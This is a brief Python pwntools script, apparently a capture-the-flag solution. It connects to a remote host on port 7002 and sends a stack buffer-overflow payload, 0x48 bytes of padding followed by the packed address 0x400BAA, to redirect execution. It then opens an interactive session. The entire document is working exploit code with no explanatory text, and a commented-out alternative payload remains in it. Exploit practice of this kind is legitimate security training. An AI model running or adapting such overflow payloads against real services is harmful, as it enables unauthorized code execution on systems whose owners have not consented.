from pwn import *

p = remote('35.186.153.116', 7002)

p.sendline('a'*0x48+p64(0x400BAA))
#p.sendline('a'*0x50)

p.interactive()
